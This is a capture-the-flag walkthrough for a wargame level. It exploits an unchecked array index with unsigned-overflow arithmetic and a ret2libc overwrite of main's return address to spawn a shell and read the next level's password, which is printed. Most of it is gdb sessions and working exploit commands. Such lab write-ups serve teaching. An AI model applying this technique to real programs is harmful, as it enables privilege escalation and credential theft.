# level07

Nothing of note with `ll`.
`checksec` tells us that the `Partial RELRO`, and `Canary found` protections are present.

Functions found using `(gdb) info functions`
|LIBC|user|
|-|-|
|printf|main|
|fflush|store_number|
|getchar|read_number|
|fgets||
|puts||
|memset||
|scanf||


This program does 3 things :
- Storing numbers in an array of 100.
- Reading from said array.
- Quitting the program.

If we look at the number storing function, we can see that it does not check for the array's max size.
Therefore, we could theorically overwrite any data located above the program.


Unfortunately the program is protected by **Canaries**, they will detect any attempt voluntary or otherwise to write outside the bounds of the function.

Only the main is protected by one. It is located at **data[106]** see NOTE: for further explanations.

```sh
# Finding the return address of `main()` and it's index relative to data[]
gdb ./level07
[...]
(gdb) info frame
Stack level 0, frame at 0xffffd6e0:
 eip = 0x8048729 in main; saved eip 0xf7e45513		# < `main()`'s return address
[...]
(gdb) quit

for i in $(seq 100 120); do (printf $i' 0x%08x\n' $((python -c "print('read'); print('$i'); print('quit');" | ./level07) | grep "at data" | awk '{print $NF}')); done;
[...]
114 0xf7e45513		# < the same address
[...]
```

This means that the address of main is located at index **114** relative to *data[]*.
Unfortunately, any index divisible by **3** is prevented from use by `store_number()`. Guess what, **114** is divisible by **3**, as such we will need to trick this check somehow.

`store_number()` checks an *unsigned int*, but it stores *number* by offsetting *data*.
In the code it actually looks like

```c
	*(uint *)(index * 4 + data) = number;
```

*index* gets multiplied by 4 (size of an int) then added to *data*'s pointer to access the correct spot. It is possible to overflow *index* using this multiplication.

Since we want to access **data[114]**, we need an offset of **114 * 4 bytes** (456) + **4294967295** (UINT_MAX (2^32)).
But this is still in bytes, so we need to divide this by 4 to get the value as an index.

```python
(114 * 4) + 2^32 == 456 + 4294967295 == 4294967752

4294967752 / 4 = 1073741938
```

Let's check that
```sh
gdb ./level07
(gdb) r
[...]
Input command: store
 Number: 2863311530			# 0xaaaaaaaa
 Index: 1073741938
 Completed store command successfully
Input command: quit

Program received signal SIGSEGV, Segmentation fault.
0xaaaaaaaa in ?? ()
```

Now we need the addresses of the `system()` function and `/bin/sh`

```sh
gdb ./level07
(gdb) start
[...]
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc mappings
process 19648
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	[...]
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so		# < libc .text address range
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	[...]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

Now we have
|target|address|numerical value|target index|
|-|-|-|-|
|**system()**|0xf7e6aed0|4159090384|**114** (1073741938)|
|**"/bin/sh"**|0xf7f897ec|4160264172|**116**|

**"/bin/sh"** is at index **116** since **115** is supposed to become `system()`'s own return address. Some would put the address of `exit()` there but it is not how I do things.

Let's wrap this in a nice "clean" command
```sh
(cat <(python -c "\
print('store'); print('4159090384'); print('1073741938'); \
print('store'); print('4160264172'); print('116'); \
print('quit');") -) | ./level07
[...]
whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

Let's begin the second to last level!

```sh
su level08
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

NOTE: We can find the **Canary** using this command

```sh
for i in $(seq 100 110); do (python -c "print('store'); print('50'); print('$i'); print('read'); print('$i'); print('quit');" | ./level07) | grep "at data"; done;

Input command:  Index:  Number at data[100] is 1
Input command:  Index:  Number at data[101] is 1684104562
Input command:  Index:  Number at data[102] is 0
Input command:  Index:  Number at data[103] is 0
Input command:  Index:  Number at data[104] is 0
Input command:  Index:  Number at data[105] is 0
*** stack smashing detected ***:  terminated
======= Backtrace: =========
/lib32/libc.so.6(__fortify_fail+0x45)[0xf7f2f615]
/lib32/libc.so.6(+0x1035ca)[0xf7f2f5ca]
[0x80489ea]
/lib32/libc.so.6(__libc_start_main+0xf3)[0xf7e45513]
[0x8048531]
======= Memory map: ========
08048000-08049000 r-xp 00000000 00:11 12778                              /home/users/level07/level07
08049000-0804a000 r-xp 00001000 00:11 12778                              /home/users/level07/level07
0804a000-0804b000 rwxp 00002000 00:11 12778                              /home/users/level07/level07
0804b000-0806c000 rwxp 00000000 00:00 0                                  [heap]
f7e07000-f7e23000 r-xp 00000000 07:00 94888                              /usr/lib32/libgcc_s.so.1
f7e23000-f7e24000 r-xp 0001b000 07:00 94888                              /usr/lib32/libgcc_s.so.1
f7e24000-f7e25000 rwxp 0001c000 07:00 94888                              /usr/lib32/libgcc_s.so.1
f7e2b000-f7e2c000 rwxp 00000000 00:00 0 
f7e2c000-f7fcc000 r-xp 00000000 07:00 28198                              /lib32/libc-2.15.so
f7fcc000-f7fcd000 ---p 001a0000 07:00 28198                              /lib32/libc-2.15.so
f7fcd000-f7fcf000 r-xp 001a0000 07:00 28198                              /lib32/libc-2.15.so
f7fcf000-f7fd0000 rwxp 001a2000 07:00 28198                              /lib32/libc-2.15.so
f7fd0000-f7fd4000 rwxp 00000000 00:00 0 
f7fd7000-f7fdb000 rwxp 00000000 00:00 0 
f7fdb000-f7fdc000 r-xp 00000000 00:00 0                                  [vdso]
f7fdc000-f7ffc000 r-xp 00000000 07:00 28175                              /lib32/ld-2.15.so
f7ffc000-f7ffd000 r-xp 0001f000 07:00 28175                              /lib32/ld-2.15.so
f7ffd000-f7ffe000 rwxp 00020000 07:00 28175                              /lib32/ld-2.15.so
fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]
Input command:  Index:  Number at data[106] is 50
Input command:  Index:  Number at data[107] is 50
Input command:  Index:  Number at data[108] is 0
Input command:  Index:  Number at data[109] is 50
Input command:  Index:  Number at data[110] is 50
```

If we try to write at index **106** of **data**, we will trigger the **Canary** which will *terminate* the program.

```sh
(python -c "print('store'); print('50'); print('106'); print('quit');" | ./level07)
[...]
*** stack smashing detected ***:  terminated
[...]
```
